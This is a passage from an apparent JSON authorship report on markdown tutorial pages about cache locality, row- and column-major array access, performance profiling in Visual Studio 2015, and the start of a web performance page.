        },
        "content": "* Spatial Locality"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "* Row/Column Major Order"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "#### Temporal Locality"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "This rule states that recently used memory will likely be used in the near future. This means that making the scope of your variables smaller helps with execution times, as it will likely result in less cache misses."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "#### Spatial Locality"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "This rule states that memory stored near each other will likely be used in the near future. This means that using contiguous data structures, such as arrays, help improve the execution times. This is because the contiguous block of memory will likely contain the other elements of the array, resulting in less **cache misses**."
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "An example of a Data Structure that does not do well in this aspect is [Linked List](https://www.tutorialspoint.com/data_structures_algorithms/linked_list_algorithms.htm). In a Linked List, each node can be stored anywhere on the memory. This means that there will likely be more cache misses when trying to iterate through a Linked List. This can cause Linked Lists to be much slower than what you would expect in theory."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "#### Row/Column Major Order"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "This rule is about how multidimensional arrays are stored in memory. Different programming languages have different methods of storing multidimensional arrays. [More Information](https://en.wikipedia.org/wiki/Row-_and_column-major_order)."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "Using the incorrect method of access can cause many cache misses, resulting in a much slower execution time. Thus, it is important to be aware of which major order the programming language is using."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "For example, Java uses Row Major Order. We can create a test to see how big an impact using the wrong Major Order can be on the execution time."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "int size \u003d 10000;"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "int[][] arr \u003d new int[size][size];"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "int x \u003d 0;"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "//Row Major order accessing"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "long time \u003d System.currentTimeMillis();"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "for (int i \u003d 0; i \u003c size; i++) {"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "    for (int j \u003d 0; j \u003c size; j++) {"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "        x +\u003d arr[i][j];"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "System.out.println(\"Row major: \" + (System.currentTimeMillis() - time));"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "//Column Major order accessing"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "time \u003d System.currentTimeMillis();"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "for (int i \u003d 0; i \u003c size; i++) {"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "    for (int j \u003d 0; j \u003c size; j++) {"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "        x +\u003d arr[j][i];"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "System.out.println(\"Column major: \" +(System.currentTimeMillis() - time));"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "In the example above, Row major takes around 100ms, while column major takes around 2000ms. You can use the codes above and try it on your own too."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e This test was done on a typical notebook. Your results may vary based on the hardware of your computer"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "[Wikipedia](https://en.wikipedia.org/wiki/Locality_of_reference) and the [University of Maryland](https://www.cs.umd.edu/class/fall2001/cmsc411/proj01/cache/matrix.html) have excellent articles which covers everything I have mentioned and more."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "## Other Resources"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "If you want to know more about Optimization, especially for that critical 3%, these other resources could be useful:"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "* Finding the critical path - [Performance Profiling](PerformanceProfiling.html)"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 4,
      "-": 132
    }
  },
  {
    "path": "contents/performance/PerformanceProfiling.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Performance Profiling"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Performance Profiling"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Ong Heng Le](https://github.com/initialshl)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "A performance profiler is a tool which collects data (such as function timings) about "
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "your program to identify the areas with performance issues, commonly used in code "
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "optimization. There are two common types of performance profiling methods."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "* **CPU sampling**: Collects *samples* at fixed intervals, which provides an overview of your program\u0027s performance"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "* **Instrumentation**: Collects detailed *elapsed times* for your program\u0027s function calls"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "Learn [which profiling method to use for your program](https://blogs.msdn.microsoft.com/ejarvi/2005/04/07/the-choice-between-sampling-and-instrumentation/) "
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "when choosing between CPU sampling and instrumentation."
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Performance Profiling for the First Time"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "This article provides resources to help you identify the performance issues as you "
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "perform profiling on your program for the first time. The general steps in profiling a "
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "program for the first time are:"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "1. Run a performance profiling session "
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "1. View the performance report "
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "1. Trace down to the problem "
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "1. Identify areas for improvements upwards "
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Most profilers are similar in their functionalities, user interface, and use of "
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "technical terms. You may adapt the tutorials in this article to your preferred profiling "
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "tools on your own project. "
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "* [Profiling a Desktop Application In Visual Studio 2015](ProfilingDesktopAppVS2015.html)"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "## Advanced Topics"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "### Sampling Interval"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "CPU sampling captures data at fixed intervals, usually based on CPU cycles or time. Many "
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "profilers offer the option to **set a custom interval or perform sampling based on events**, "
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "such as page faults or system calls, in the sampling settings."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "* For Visual Studio 2015: [How to: Choose Sampling Events](https://msdn.microsoft.com/en-us/library/ms182376.aspx)\u003cbr\u003e"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "* For YourKit Java Profiler: [YourKit Java Profiler Help - CPU sampling settings](https://www.yourkit.com/docs/java/help/sampling_settings.jsp)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "### Instrumentation Overhead"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "Instrumentation profiling incurs a substantial overhead, which is an increase in file size "
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "and execution time of the program. This makes it unsuitable for large projects. In such "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "cases, it is recommended to **limit instrumentation to a specific portion of your project**. "
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "* For Visual Studio 2015: [How to: Limit Instrumentation to Specific Functions](https://msdn.microsoft.com/en-us/library/cc470663.aspx) "
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "or [Specific DLLs](https://msdn.microsoft.com/en-us/library/bb385752.aspx)"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "To reduce instrumentation overhead, some profilers may exclude *small functions*, which "
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "are short functions that do not make any function calls, and treat the time as being "
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "spent in their calling functions. This behavior is usually enabled by default, which may "
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "be undesirable when you want to **examine *small functions* carefully**. Most profilers "
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "offer the option to change this behavior."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "* For Visual Studio 2015: [How to: Exclude or Include Short Functions from Instrumentation](https://msdn.microsoft.com/en-us/library/bb514150.aspx)"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Profiling Other Types of Data"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "Other than collecting performance statistics and timing data, profilers are also able "
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "to collect other information such as memory allocation and GPU usage. "
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "For Visual Studio 2015: "
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "1. List of [Profiling Tools](https://msdn.microsoft.com/en-us/library/mt210448.aspx) (A [table](https://msdn.microsoft.com/en-us/library/mt210448.aspx#Anchor_10) which shows the most suitable tool for each project)"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "1. [How to: Collect Performance Data for a Web Site](https://msdn.microsoft.com/en-us/library/2s0xxa1d.aspx) (ASP.NET and JavaScript)"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Collecting .NET Memory Allocation and Lifetime Data](https://msdn.microsoft.com/en-us/library/dd264934.aspx)"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Collecting Thread and Process Concurrency Data](https://msdn.microsoft.com/en-us/library/dd265004.aspx)"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Collecting tier interaction data](https://msdn.microsoft.com/en-us/library/dd465169.aspx)"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "1. What is a software profiler?: [Profiling Overview](https://msdn.microsoft.com/en-us/library/bb384493(v\u003dvs.110).aspx)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "1. Common performance profiling methods: [Understanding Performance Collection Methods](https://msdn.microsoft.com/en-us/library/dd264994.aspx)"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "1. Learn the best practices in profiling: [Advanced Profiling: Theory in Practice with NetBeans IDE](https://netbeans.org/community/magazine/html/04/profiler.html)"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "1. Why do profilers exclude small functions from instrumentation by default?: [Excluding Small Functions From Instrumentation](https://blogs.msdn.microsoft.com/profiler/2008/07/08/excluding-small-functions-from-instrumentation/)"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "-": 92
    }
  },
  {
    "path": "contents/performance/ProfilingDesktopAppVS2015.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Profiling a Desktop Application In Visual Studio 2015"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Profiling a Desktop Application in Visual Studio 2015"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Ong Heng Le](https://github.com/initialshl)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "This tutorial demonstrates how to get an overview of your desktop application\u0027s performance"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "using the profiler included in [Visual Studio 2015](https://www.visualstudio.com/downloads/). "
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## 1. Run a Performance Profiling Session"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "To start a performance profiling session, follow this guide on "
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "[Creating and running a performance session](https://msdn.microsoft.com/en-us/library/ms182372.aspx#Anchor_0)."
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "## 2. View the performance report"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "The profiler will generate the performance report after the profiling session, which you "
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "can explore on your own. *Inclusive and exclusive data* provides meaningful information "
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "about the execution time of each function."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "* **Inclusive samples**: Collected during execution of the function itself and all functions it calls"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "* **Exclusive samples**: Collected during execution of the function itself only"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e The Visual Studio Profiler Team Blog has a [good explanation on inclusive and exclusive data values](https://blogs.msdn.microsoft.com/profiler/2004/06/09/what-are-exclusive-and-inclusive/)."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## 3. Trace Down to the Problem"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "You can identify the performance issues using the performance report. The `Summary` view "
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "shows these two useful information analyzed by the profiler."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "* **Functions With Most Individual Work**: The functions which took up the most execution time *(exclusive samples)*"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "* **Hot Path**: The branch of the call tree which took up the most execution time *(inclusive samples)*"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "To locate performance issues quickly, the **Functions With Most Individual Work** provides "
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "a list of functions which are usually candidates for optimization."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "If you would like to trace down to the problem more carefully, the **Hot Path** is a good "
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "starting point. This will familiarize you about the most expensive execution path taken "
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "by your program. "
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e You can follow this [walkthrough](https://msdn.microsoft.com/en-us/library/ms182398.aspx)"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "to experience how to identify performance problems and optimize your code."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## 4. Identify Areas for Improvements Upwards"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "You have identified the problem, and may now want to optimize the code in the "
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "function body. But before that, here\u0027s a final tip: It is sometimes easier "
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "(and better) to optimize by "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "**reducing the number of calls to that function in its calling functions.** "
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "1. The general steps in profiling your program: [Beginners Guide to Performance Profiling](https://msdn.microsoft.com/en-us/library/ms182372.aspx)"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "1. Read my chapter on performance profiling for more advanced topics: [Performance Profiling](PerformanceProfiling.html)"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "-": 65
    }
  },
  {
    "path": "contents/performance/WebPerformance.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Web Performance"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Web Performance"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Marvin Chin](https://github.com/marvinchin)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Lu Yang Kenneth](https://github.com/luyangkenneth), [Monika Manuela Hengki](https://www.github.com/monmanuela)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Web Performance?"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
